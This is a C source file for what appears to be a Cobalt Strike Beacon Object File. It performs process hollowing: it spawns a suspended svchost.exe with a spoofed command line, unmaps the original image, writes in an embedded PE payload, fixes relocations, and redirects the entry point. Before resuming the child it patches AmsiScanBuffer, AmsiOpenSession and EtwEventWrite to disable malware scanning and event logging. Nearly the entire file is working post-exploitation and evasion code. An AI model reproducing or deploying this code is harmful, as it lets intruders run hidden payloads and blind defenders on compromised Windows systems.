#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stddef.h>

#include "shellcode.h"
#include "beacon.h"
#include "definitions.h"

#define MAX_NUM(a, b) a > b ? a : b;
#define MIN_NUM(a, b) a < b ? a : b;
#define BOF_OUTPUT_TIMEOUT_MS 30000
#define BOF_POLL_INTERVAL_MS  200

/* ================================================================
 *  Minimal CRT replacements
 * ================================================================ */

void *_memset(void *dest, int c, size_t n) {
    unsigned char *d = (unsigned char *)dest;
    while (n--) *d++ = (unsigned char)c;
    return dest;
}

void *_memcpy(void *dest, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dest;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
    return dest;
}

void ZeroMemoryCustom(BYTE* pAddress, DWORD dwSize) {
    _memset(pAddress, 0, dwSize);
}

/* ================================================================
 *  AMSI + ETW patching in remote (child) process
 *
 *  Per-boot ASLR: system DLLs map at same base in every process,
 *  so local GetProcAddress gives the correct remote address.
 *  Verification: read-back confirms patch landed.
 * ================================================================ */

static BOOL PatchRemoteFunction(HANDLE hProcess, HMODULE hLocalMod,
                                const char *funcName, BYTE *patch, DWORD patchLen) {
    FARPROC pFunc = KERNEL32$GetProcAddress(hLocalMod, funcName);
    if (!pFunc) return FALSE;

    LPVOID pRemoteFunc = (LPVOID)pFunc;
    DWORD dwOldProtect = 0;
    if (!KERNEL32$VirtualProtectEx(hProcess, pRemoteFunc, patchLen, PAGE_READWRITE, &dwOldProtect))
        return FALSE;

    SIZE_T written = 0;
    BOOL ok = KERNEL32$WriteProcessMemory(hProcess, pRemoteFunc, patch, patchLen, &written);

    DWORD dwDummy = 0;
    KERNEL32$VirtualProtectEx(hProcess, pRemoteFunc, patchLen, dwOldProtect, &dwDummy);

    if (!ok || written != patchLen) return FALSE;

    BYTE verify[16];
    SIZE_T br = 0;
    if (patchLen <= sizeof(verify)) {
        if (KERNEL32$ReadProcessMemory(hProcess, pRemoteFunc, verify, patchLen, &br) && br == patchLen) {
            for (DWORD i = 0; i < patchLen; i++) {
                if (verify[i] != patch[i]) return FALSE;
            }
        }
    }
    return TRUE;
}

static void PatchAMSI(HANDLE hProcess) {
    HMODULE hAmsi = KERNEL32$GetModuleHandleA("amsi.dll");
    if (!hAmsi) return;

    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    PatchRemoteFunction(hProcess, hAmsi, "AmsiScanBuffer", patch, sizeof(patch));
    PatchRemoteFunction(hProcess, hAmsi, "AmsiOpenSession", patch, sizeof(patch));
}

static void PatchETW(HANDLE hProcess) {
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    /* xor eax, eax; ret */
    BYTE etwPatch[] = { 0x33, 0xC0, 0xC3 };
    if (PatchRemoteFunction(hProcess, hNtdll, "EtwEventWrite", etwPatch, sizeof(etwPatch)))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW: EtwEventWrite patched");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ETW: EtwEventWrite patch FAILED");
}

/* ================================================================
 *  Map flat PE file to SizeOfImage layout (sections at VA offsets)
 *  so RVAs work directly as buffer offsets for relocations.
 * ================================================================ */

static BYTE* MapPEToImage(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt) {
    DWORD imageSize = pNt->OptionalHeader.SizeOfImage;
    BYTE *mapped = (BYTE*)KERNEL32$LocalAlloc(0x40, imageSize);
    if (!mapped) return NULL;

    _memset(mapped, 0, imageSize);
    _memcpy(mapped, peData, pNt->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData == 0) continue;
        if (pSec[i].PointerToRawData + pSec[i].SizeOfRawData > peSize) continue;
        if (pSec[i].VirtualAddress + pSec[i].SizeOfRawData > imageSize) continue;
        _memcpy(mapped + pSec[i].VirtualAddress,
                peData + pSec[i].PointerToRawData,
                pSec[i].SizeOfRawData);
    }

    return mapped;
}

/* ================================================================
 *  Section protection mapping
 * ================================================================ */

BOOL AdjustMemoryProtections(IN HANDLE hTargetProc, IN ULONG_PTR uBaseAddr,
                             IN PIMAGE_NT_HEADERS pNtHeaders, IN PIMAGE_SECTION_HEADER pSections) {
    for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        DWORD dwNewProtect = 0, dwOldProtect = 0;

        if (!pSections[i].SizeOfRawData || !pSections[i].VirtualAddress)
            continue;

        if (pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwNewProtect = PAGE_WRITECOPY;
        if (pSections[i].Characteristics & IMAGE_SCN_MEM_READ)
            dwNewProtect = PAGE_READONLY;
        if ((pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
            (pSections[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_READWRITE;
        if (pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwNewProtect = PAGE_EXECUTE;
        if ((pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwNewProtect = PAGE_EXECUTE_WRITECOPY;
        if ((pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSections[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_EXECUTE_READ;
        if ((pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
            (pSections[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwNewProtect = PAGE_EXECUTE_READWRITE;

        if (!KERNEL32$VirtualProtectEx(hTargetProc, (PVOID)(uBaseAddr + pSections[i].VirtualAddress),
            pSections[i].SizeOfRawData, dwNewProtect, &dwOldProtect)) {
            BeaconPrintf(CALLBACK_ERROR, "VirtualProtectEx section %d: %lu", i, KERNEL32$GetLastError());
        }
    }
    return TRUE;
}

/* ================================================================
 *  Output capture from child process
 * ================================================================ */

VOID DisplayProcessOutput(IN HANDLE hOutputPipe) {
    DWORD dwBytesAvailable = 0;

    if (KERNEL32$PeekNamedPipe(hOutputPipe, NULL, 0, NULL, &dwBytesAvailable, NULL) && dwBytesAvailable > 0) {
        BYTE* pOutputData = (BYTE*)KERNEL32$LocalAlloc(LPTR, dwBytesAvailable + 1);
        if (!pOutputData) return;

        DWORD dwBytesRead = 0;
        if (KERNEL32$ReadFile(hOutputPipe, pOutputData, dwBytesAvailable, &dwBytesRead, NULL)) {
            if (dwBytesRead > 0) {
                pOutputData[dwBytesRead] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "%.*s", dwBytesRead, pOutputData);
            }
        }
        KERNEL32$LocalFree(pOutputData);
    }
}

/* ================================================================
 *  Spawn suspended process with command-line spoofing
 * ================================================================ */

BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArguments,
    OUT PPROCESS_INFORMATION pProcInfo, OUT HANDLE* phInputPipe, OUT HANDLE* phOutputPipe) {

    STARTUPINFOA stStartupInfo;
    SECURITY_ATTRIBUTES saSecurity;
    HANDLE hInputRead = NULL, hInputWrite = NULL, hOutputRead = NULL, hOutputWrite = NULL;
    LPSTR szFakeCommandLine = NULL;
    LPSTR szRealCommandLine = NULL;
    BOOL bResult = FALSE;

    ZeroMemoryCustom((BYTE*)pProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemoryCustom((BYTE*)&stStartupInfo, sizeof(STARTUPINFOA));
    ZeroMemoryCustom((BYTE*)&saSecurity, sizeof(SECURITY_ATTRIBUTES));

    saSecurity.nLength = sizeof(SECURITY_ATTRIBUTES);
    saSecurity.bInheritHandle = TRUE;

    if (!KERNEL32$CreatePipe(&hInputRead, &hInputWrite, &saSecurity, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "CreatePipe[1]: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    if (!KERNEL32$CreatePipe(&hOutputRead, &hOutputWrite, &saSecurity, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "CreatePipe[2]: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    stStartupInfo.cb = sizeof(STARTUPINFOA);
    stStartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    stStartupInfo.wShowWindow = SW_HIDE;
    stStartupInfo.hStdInput = hInputRead;
    stStartupInfo.hStdOutput = stStartupInfo.hStdError = hOutputWrite;

    char szFakeArgs[] = " -k LocalServiceNetworkRestricted";
    size_t realBufferSize = MSVCRT$strlen(szProcessPath) + (szArguments ? MSVCRT$strlen(szArguments) + 1 : 0) + 1;
    size_t fakeBufferSize = MSVCRT$strlen(szProcessPath) + MSVCRT$strlen(szFakeArgs) + 1;
    if (fakeBufferSize < realBufferSize) fakeBufferSize = realBufferSize;

    szFakeCommandLine = (LPSTR)KERNEL32$LocalAlloc(LPTR, fakeBufferSize);
    if (!szFakeCommandLine) goto CLEANUP;
    MSVCRT$_snprintf(szFakeCommandLine, fakeBufferSize, "%s%s", szProcessPath, szFakeArgs);
    {
        size_t len = MSVCRT$strlen(szFakeCommandLine);
        size_t i;
        for (i = len; i < fakeBufferSize - 1; i++) szFakeCommandLine[i] = ' ';
        szFakeCommandLine[fakeBufferSize - 1] = '\0';
    }

    szRealCommandLine = (LPSTR)KERNEL32$LocalAlloc(LPTR, realBufferSize);
    if (!szRealCommandLine) goto CLEANUP;
    if (szArguments)
        MSVCRT$_snprintf(szRealCommandLine, realBufferSize, "%s %s", szProcessPath, szArguments);
    else
        MSVCRT$_snprintf(szRealCommandLine, realBufferSize, "%s", szProcessPath);

    if (!KERNEL32$CreateProcessA(NULL, szFakeCommandLine, NULL, NULL, TRUE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &stStartupInfo, pProcInfo)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessA: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    /* Spoof command line in PEB */
    PROCESS_BASIC_INFORMATION pbi;
    PEB peb;
    RTL_USER_PROCESS_PARAMETERS parameters;
    ZeroMemoryCustom((BYTE*)&pbi, sizeof(pbi));
    ZeroMemoryCustom((BYTE*)&peb, sizeof(peb));
    ZeroMemoryCustom((BYTE*)&parameters, sizeof(parameters));

    NTSTATUS status = NTDLL$NtQueryInformationProcess(pProcInfo->hProcess, ProcessBasicInformation,
        &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "NtQueryInformationProcess: 0x%lx", status);
        goto CLEANUP;
    }

    SIZE_T bytesRead = 0;
    if (!KERNEL32$ReadProcessMemory(pProcInfo->hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), &bytesRead)) {
        BeaconPrintf(CALLBACK_ERROR, "ReadPEB: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    if (!KERNEL32$ReadProcessMemory(pProcInfo->hProcess, peb.ProcessParameters, &parameters,
        sizeof(RTL_USER_PROCESS_PARAMETERS), &bytesRead)) {
        BeaconPrintf(CALLBACK_ERROR, "ReadProcessParams: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    {
        int wideLen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, szRealCommandLine, -1, NULL, 0);
        if (wideLen == 0) goto CLEANUP;

        LPWSTR wideCmdLine = (LPWSTR)KERNEL32$LocalAlloc(LPTR, wideLen * sizeof(WCHAR));
        if (!wideCmdLine) goto CLEANUP;

        KERNEL32$MultiByteToWideChar(CP_ACP, 0, szRealCommandLine, -1, wideCmdLine, wideLen);

        SIZE_T bw = 0;
        KERNEL32$WriteProcessMemory(pProcInfo->hProcess, parameters.CommandLine.Buffer,
            wideCmdLine, wideLen * sizeof(WCHAR), &bw);

        USHORT newLen = (USHORT)((wideLen - 1) * sizeof(WCHAR));
        KERNEL32$WriteProcessMemory(pProcInfo->hProcess,
            (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
            &newLen, sizeof(USHORT), &bw);

        KERNEL32$LocalFree(wideCmdLine);
    }

    *phInputPipe = hInputWrite;
    *phOutputPipe = hOutputRead;
    bResult = TRUE;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process created (PID %lu)", pProcInfo->dwProcessId);

CLEANUP:
    if (szFakeCommandLine) KERNEL32$LocalFree(szFakeCommandLine);
    if (szRealCommandLine) KERNEL32$LocalFree(szRealCommandLine);
    if (hInputRead) KERNEL32$CloseHandle(hInputRead);
    if (hOutputWrite) KERNEL32$CloseHandle(hOutputWrite);

    if (!bResult) {
        if (pProcInfo->hProcess) {
            KERNEL32$TerminateProcess(pProcInfo->hProcess, 0);
            KERNEL32$CloseHandle(pProcInfo->hProcess);
        }
        if (pProcInfo->hThread) KERNEL32$CloseHandle(pProcInfo->hThread);
        ZeroMemoryCustom((BYTE*)pProcInfo, sizeof(PROCESS_INFORMATION));
    }

    return bResult;
}

/* ================================================================
 *  Deploy payload via process hollowing
 *
 *  1.  Spawn suspended svchost with spoofed cmdline
 *  2.  GetThreadContext -> PEB address (RDX on x64)
 *  3.  Read original ImageBase from PEB+0x10
 *  4.  NtUnmapViewOfSection - clean address space
 *  5.  VirtualAllocEx at preferred / original / any base
 *  6.  MapPEToImage - sections at VA offsets (RVAs work directly)
 *  7.  Apply relocations on mapped image if rebased
 *  8.  Write mapped sections to remote process
 *  9.  Set per-section memory protections
 *  10. Update PEB ImageBase
 *  11. Set entry point via thread context (RCX)
 *  12. Patch AMSI + ETW in child before resume
 *  13. ResumeThread -> collect output
 * ================================================================ */

BOOL DeployPayload(IN BYTE* pPayloadData, IN DWORD dwPayloadSize,
                   IN LPCSTR szTargetPath, IN OPTIONAL LPCSTR szCmdArgs) {
    if (!pPayloadData || !szTargetPath || dwPayloadSize < sizeof(IMAGE_DOS_HEADER))
        return FALSE;

    PROCESS_INFORMATION stProcInfo;
    ZeroMemoryCustom((BYTE*)&stProcInfo, sizeof(stProcInfo));
    CONTEXT ctxThread;
    ZeroMemoryCustom((BYTE*)&ctxThread, sizeof(ctxThread));
    ctxThread.ContextFlags = CONTEXT_ALL;

    HANDLE hInputPipe = NULL, hOutputPipe = NULL;
    BYTE* pRemoteMem = NULL;
    BYTE* mapped = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    SIZE_T dwBytesWritten = 0;
    BOOL bSuccess = FALSE;

    /* --- Validate PE --- */
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pPayloadData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        BeaconPrintf(CALLBACK_ERROR, "Bad DOS signature");
        return FALSE;
    }
    if ((DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > dwPayloadSize) {
        BeaconPrintf(CALLBACK_ERROR, "e_lfanew out of bounds");
        return FALSE;
    }
    pNtHeaders = (PIMAGE_NT_HEADERS)(pPayloadData + pDos->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid NT signature");
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] PE: Base=0x%llx Size=0x%lx EP=0x%lx",
        (unsigned long long)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage,
        pNtHeaders->OptionalHeader.AddressOfEntryPoint);

    /* --- Step 1: Spawn suspended process --- */
    if (!SpawnSuspendedProcess(szTargetPath, szCmdArgs, &stProcInfo, &hInputPipe, &hOutputPipe))
        goto CLEANUP;

    /* --- Step 2: Get thread context, PEB from RDX --- */
    if (!KERNEL32$GetThreadContext(stProcInfo.hThread, &ctxThread)) {
        BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

#ifdef _WIN64
    ULONG_PTR pebAddr = ctxThread.Rdx;
#else
    ULONG_PTR pebAddr = ctxThread.Ebx;
#endif
    ULONG_PTR origImageBase = 0;
    SIZE_T br = 0;

#ifdef _WIN64
    if (!KERNEL32$ReadProcessMemory(stProcInfo.hProcess, (PVOID)(pebAddr + 0x10),
            &origImageBase, sizeof(origImageBase), &br)) {
#else
    if (!KERNEL32$ReadProcessMemory(stProcInfo.hProcess, (PVOID)(pebAddr + 0x08),
            &origImageBase, sizeof(origImageBase), &br)) {
#endif
        BeaconPrintf(CALLBACK_ERROR, "Read PEB ImageBase: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    /* --- Step 4: Unmap original image --- */
    NTSTATUS st = NTDLL$NtUnmapViewOfSection(stProcInfo.hProcess, (PVOID)origImageBase);
    if (st == 0)
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Original image unmapped (was 0x%llx)", (unsigned long long)origImageBase);

    /* --- Step 5: Allocate remote memory --- */
    pRemoteMem = (BYTE*)KERNEL32$VirtualAllocEx(stProcInfo.hProcess,
        (PVOID)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) {
        pRemoteMem = (BYTE*)KERNEL32$VirtualAllocEx(stProcInfo.hProcess,
            (PVOID)origImageBase,
            pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!pRemoteMem) {
        pRemoteMem = (BYTE*)KERNEL32$VirtualAllocEx(stProcInfo.hProcess, NULL,
            pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!pRemoteMem) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocated 0x%lx bytes at 0x%p",
        pNtHeaders->OptionalHeader.SizeOfImage, pRemoteMem);

    /* --- Step 6: Map PE to SizeOfImage layout --- */
    mapped = MapPEToImage(pPayloadData, dwPayloadSize, pNtHeaders);
    if (!mapped) {
        BeaconPrintf(CALLBACK_ERROR, "MapPEToImage failed");
        goto CLEANUP;
    }

    PIMAGE_DOS_HEADER pDosM = (PIMAGE_DOS_HEADER)mapped;
    PIMAGE_NT_HEADERS pNtM = (PIMAGE_NT_HEADERS)(mapped + pDosM->e_lfanew);
    DWORD imageSize = pNtM->OptionalHeader.SizeOfImage;

    /* --- Step 7: Relocations on mapped image (if rebased) --- */
    if ((ULONG_PTR)pRemoteMem != pNtM->OptionalHeader.ImageBase) {
        ULONG_PTR uDelta = (ULONG_PTR)pRemoteMem - pNtM->OptionalHeader.ImageBase;
        IMAGE_DATA_DIRECTORY relocDir = pNtM->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size == 0) {
            BeaconPrintf(CALLBACK_ERROR, "Relocation needed but PE has no reloc table");
            goto CLEANUP;
        }
        if (relocDir.VirtualAddress >= imageSize) {
            BeaconPrintf(CALLBACK_ERROR, "Reloc directory out of bounds");
            goto CLEANUP;
        }

        BYTE* pRelocBlock = mapped + relocDir.VirtualAddress;
        DWORD dwProcessed = 0;
        while (dwProcessed < relocDir.Size) {
            DWORD dwPageRva   = *(DWORD*)(pRelocBlock);
            DWORD dwBlockSize = *(DWORD*)(pRelocBlock + 4);
            if (dwBlockSize == 0 || dwBlockSize < 8) break;

            DWORD dwEntryCount = (dwBlockSize - 8) / 2;
            WORD* pEntries = (WORD*)(pRelocBlock + 8);
            for (DWORD j = 0; j < dwEntryCount; j++) {
                BYTE bType  = (BYTE)(pEntries[j] >> 12);
                WORD wOff   = pEntries[j] & 0x0FFF;
                DWORD patchRva = dwPageRva + wOff;

                if (bType == IMAGE_REL_BASED_DIR64) {
                    if (patchRva + 8 > imageSize) continue;
                    *(ULONG_PTR*)(mapped + patchRva) += uDelta;
                } else if (bType == IMAGE_REL_BASED_HIGHLOW) {
                    if (patchRva + 4 > imageSize) continue;
                    *(DWORD*)(mapped + patchRva) += (DWORD)uDelta;
                }
            }
            pRelocBlock += dwBlockSize;
            dwProcessed += dwBlockSize;
        }
        pNtM->OptionalHeader.ImageBase = (ULONG_PTR)pRemoteMem;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Relocations applied (delta=0x%llx)", (unsigned long long)uDelta);
    }

    /* --- Step 8: Write mapped image to remote --- */
    if (!KERNEL32$WriteProcessMemory(stProcInfo.hProcess, pRemoteMem, mapped,
            pNtM->OptionalHeader.SizeOfHeaders, &dwBytesWritten)) {
        BeaconPrintf(CALLBACK_ERROR, "Write headers: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    {
        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtM);
        for (DWORD i = 0; i < pNtM->FileHeader.NumberOfSections; i++) {
            if (pSec[i].SizeOfRawData == 0) continue;
            if (!KERNEL32$WriteProcessMemory(stProcInfo.hProcess,
                    pRemoteMem + pSec[i].VirtualAddress,
                    mapped + pSec[i].VirtualAddress,
                    pSec[i].SizeOfRawData, &dwBytesWritten)) {
                BeaconPrintf(CALLBACK_ERROR, "Write section %d: %lu", i, KERNEL32$GetLastError());
                goto CLEANUP;
            }
        }

        /* --- Step 9: Section protections --- */
        AdjustMemoryProtections(stProcInfo.hProcess, (ULONG_PTR)pRemoteMem, pNtM, pSec);
    }

    KERNEL32$FlushInstructionCache(stProcInfo.hProcess, pRemoteMem, imageSize);

    /* Save entry RVA before freeing mapped */
    DWORD entryRva = pNtM->OptionalHeader.AddressOfEntryPoint;

    KERNEL32$LocalFree(mapped);
    mapped = NULL;

    /* --- Step 10: Update PEB ImageBase --- */
    {
        ULONG_PTR newBase = (ULONG_PTR)pRemoteMem;
#ifdef _WIN64
        KERNEL32$WriteProcessMemory(stProcInfo.hProcess, (PVOID)(pebAddr + 0x10),
            &newBase, sizeof(newBase), &dwBytesWritten);
#else
        KERNEL32$WriteProcessMemory(stProcInfo.hProcess, (PVOID)(pebAddr + 0x08),
            &newBase, sizeof(newBase), &dwBytesWritten);
#endif
    }

    /* --- Step 11: Set entry point via RCX --- */
#ifdef _WIN64
    ctxThread.Rcx = (DWORD64)(pRemoteMem + entryRva);
#else
    ctxThread.Ecx = (DWORD)(pRemoteMem + entryRva);
#endif

    if (!KERNEL32$SetThreadContext(stProcInfo.hThread, &ctxThread)) {
        BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    /* --- Step 12: AMSI + ETW patching before resume --- */
    PatchAMSI(stProcInfo.hProcess);
    PatchETW(stProcInfo.hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] PE hollowed at 0x%p, entry 0x%p",
        pRemoteMem, (void*)(ULONG_PTR)(pRemoteMem + entryRva));

    /* --- Step 13: Resume + collect output --- */
    if (KERNEL32$ResumeThread(stProcInfo.hThread) == (DWORD)-1) {
        BeaconPrintf(CALLBACK_ERROR, "ResumeThread: %lu", KERNEL32$GetLastError());
        goto CLEANUP;
    }

    {
        DWORD dwExitCode = STILL_ACTIVE;
        DWORD dwElapsed = 0;
        while (dwElapsed < BOF_OUTPUT_TIMEOUT_MS) {
            if (!KERNEL32$GetExitCodeProcess(stProcInfo.hProcess, &dwExitCode)) break;
            if (dwExitCode != STILL_ACTIVE) break;
            DisplayProcessOutput(hOutputPipe);
            KERNEL32$Sleep(BOF_POLL_INTERVAL_MS);
            dwElapsed += BOF_POLL_INTERVAL_MS;
        }
        DisplayProcessOutput(hOutputPipe);

        if (dwElapsed >= BOF_OUTPUT_TIMEOUT_MS && dwExitCode == STILL_ACTIVE) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Timeout (%ds), terminating child", BOF_OUTPUT_TIMEOUT_MS / 1000);
            KERNEL32$TerminateProcess(stProcInfo.hProcess, 0);
        }
    }

    bSuccess = TRUE;

CLEANUP:
    if (mapped) KERNEL32$LocalFree(mapped);
    if (!bSuccess && stProcInfo.hProcess)
        KERNEL32$TerminateProcess(stProcInfo.hProcess, 0);
    if (hInputPipe) KERNEL32$CloseHandle(hInputPipe);
    if (hOutputPipe) KERNEL32$CloseHandle(hOutputPipe);
    if (stProcInfo.hProcess) KERNEL32$CloseHandle(stProcInfo.hProcess);
    if (stProcInfo.hThread) KERNEL32$CloseHandle(stProcInfo.hThread);
    return bSuccess;
}

#define TARGET_APP_PATH "C:\\Windows\\System32\\svchost.exe"

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    char peArgs[2048];
    ZeroMemoryCustom((BYTE*)peArgs, sizeof(peArgs));

    int argCount = 0;
    char *currentArg;

    currentArg = BeaconDataExtract(&parser, NULL);

    if (currentArg == NULL || currentArg[0] == '\0') {
        MSVCRT$strcpy(peArgs, "coffee exit");
        BeaconPrintf(CALLBACK_OUTPUT, "Using default arguments: %s", peArgs);
    } else {
        if (MSVCRT$strchr(currentArg, ' ') != NULL) {
            MSVCRT$strcpy(peArgs, "\"");
            MSVCRT$strcat(peArgs, currentArg);
            MSVCRT$strcat(peArgs, "\"");
        } else {
            MSVCRT$strcpy(peArgs, currentArg);
        }
        argCount++;

        while ((currentArg = BeaconDataExtract(&parser, NULL)) != NULL) {
            if (MSVCRT$strchr(currentArg, ' ') != NULL) {
                MSVCRT$strcat(peArgs, " \"");
                MSVCRT$strcat(peArgs, currentArg);
                MSVCRT$strcat(peArgs, "\"");
            } else {
                MSVCRT$strcat(peArgs, " ");
                MSVCRT$strcat(peArgs, currentArg);
            }
            argCount++;
        }

        MSVCRT$strcat(peArgs, " exit");
        BeaconPrintf(CALLBACK_OUTPUT, "Using %d arguments: %s", argCount, peArgs);
    }

    if (!DeployPayload((BYTE*)shellcode, sizeof(shellcode), TARGET_APP_PATH, peArgs)) {
        BeaconPrintf(CALLBACK_ERROR, "Payload deployment failed");
    }
}
